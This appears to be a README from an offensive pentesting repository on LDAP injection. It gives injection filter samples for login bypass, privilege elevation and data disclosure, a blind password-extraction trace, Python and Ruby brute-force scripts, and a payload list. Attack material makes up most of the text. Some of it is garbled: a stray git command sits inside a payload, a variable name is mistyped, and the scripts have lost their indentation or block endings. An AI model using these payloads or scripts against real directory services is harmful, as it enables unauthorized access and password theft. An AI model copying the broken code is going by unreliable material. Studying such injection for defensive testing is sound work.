# LDAP INJECTION

## What Is LDAP Injection?

Lightweight Directory Access Protocol (LDAP) injection is a vulnerability in which queries are constructed from untrusted input without prior validation or sanitization. LDAP uses queries constructed from predicates that involve the use of special characters (e.g., brackets, asterisks, ampersands, or quotes). Metacharacters such as these control the meaning of the query; thereby, affecting the type and number of objects retrieved from the underlying directory. If an attacker can submit input containing these control characters, they can alter the query and change the intended behavior.

 - [LDAP Injection](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#what-is-ldap-injection)
   
   - [Types of LDAP Injection Attacks](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#what-is-ldap-injection)

      - [Access Control Bypass](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#access-control-bypass)
      - [Elevation of Privileges](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#elevation-of-privileges)
      - [Information Disclosure](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#information-disclosure)

   - [LDAP Injection Using Logical Operators](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#ldap-injection-using-logical-operators)

   - [Exploitation](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#exploitation)
   - [Scripts](https://github.com/armourinfosec/Offensive-Pentesting-Web/blob/main/Injections/LDAP-Injection/README.md#scripts)

## Access Control Bypass

    (&(USER=Uname)(PASSWORD=Pwd)) (&(USER=john90)(&))(PASSWORD=Pwd))

## Elevation of Privileges

    "Information)(security_level=*))(&(directory=documents"
    (&(directory=Information)(security_level=*))(&(directory=Information)
    git add README.md(security_level=low))

## Information Disclosure

    (|(type=Resource1)(type=Resource2)) (|(type=Jeans)(uid=*))(type=T-Shirts)
    
# LDAP Injection Using Logical Operators

     AND LDAP Injection

     (&(parameter1=value1)(parameter2=value2))


     AND Blind LDAP Injection
     (&(objectClass=*)(objectClass=users))(&(objectClass=foo)(type=Puma*))

     (&(objectClass=*)(objectClass=Resources))(&(objectClass=foo)(type=Puma*))


     OR LDAP Injection

     (|(parameter=value1)(parameter2=value2))


     OR Blind LDAP Injection

     (|(objectClass=void)(objectClass=users))(&(objectClass=void)(type=Puma*))

     (|(objectClass=void)(objectClass=Resources))(&(objectClass=void)(type=Puma*))    

 # Exploitation
 
  ## Example 1.
 
     user  = *)(uid=*))(|(uid=*
     pass  = password
     query = "(&(uid=*)(uid=*)) (|(uid=*)(userPassword={MD5}X03MO1qnZdYdgyfeuILPmQ==))"

# Blind Exploitation

     We can extract using a bypass login

     (&(sn=administrator)(password=*))    : OK
     (&(sn=administrator)(password=A*))   : OK
     (&(sn=administrator)(password=B*))   : OK
     ...
     (&(sn=administrator)(password=M*))   : OK
     (&(sn=administrator)(password=MA*))  : OK
     (&(sn=administrator)(password=MB*))  : OK
     ...
     (&(sn=administrator)(password=MY*))  : OK
     (&(sn=administrator)(password=MYA*)) : OK
     (&(sn=administrator)(password=MYB*)) : OK
     (&(sn=administrator)(password=MYC*)) : OK
     ...
     (&(sn=administrator)(password=MYK*)) : OK
     (&(sn=administrator)(password=MYKE)) : OK

# Scripts

 ## Discover valid LDAP fields

    #!/usr/bin/python3

    import requests
    import string

    fields = []

    url = 'https://URL.com/'

    f = open('dic', 'r') #Open the wordlists of common attributes
    wordl = f.read().split('\n')
    f.close()

    for i in world:
      r = requests.post(url, data = {'login':'*)('+str(i)+'=*))\x00', 'password':'bla'}) #Like (&(login=*)(ITER_VAL=*))\x00)(password=bla))
      if 'TRUE CONDITION' in r.text:
         fields.append(str(i))

    print(fields)
    
## Special blind LDAP injection (without “*”)
## Python
       #!/usr/bin/python3

       import requests, string
       alphabet = string.ascii_letters + string.digits + "_@{}-/()!\"$%=^[]:;"

       flag = ""
       for i in range(50):
       print("[i] Looking for number " + str(i))
       for char in alphabet:
       r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
       if ("TRUE CONDITION" in r.text):
       flag += char
       print("[+] Flag: " + flag)
       break
## Ruby
       #!/usr/bin/env ruby

       require 'net/http'
       alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')

       flag = ''

       (0..50).each do |i|
       puts("[i] Looking for number #{i}")
       alphabet.each do |char|
       r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
       if /TRUE CONDITION/.match?(r)
       flag += char
       puts("[+] Flag: #{flag}")
       break

    
# Payloads

    *
    *)(&
    *))%00
     )(cn=))\x00
     *()|%26'
     *()|&'
     *(|(mail=*))
     *(|(objectclass=*))
     *)(uid=*))(|(uid=*
     */*
     *|
     /
     //
     //*
     @*
     |
     admin*
     admin*)((|userpassword=*)
     admin*)((|userPassword=*)
     x' or name()='username' or 'x'='y

    
# References

  [OWASP](https://owasp.org/www-community/attacks/LDAP_Injection)  
  [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection)  
  [ldap](https://ldap.com/basic-ldap-concepts/)  
  [okta](https://www.okta.com/identity-101/what-is-ldap/)
  
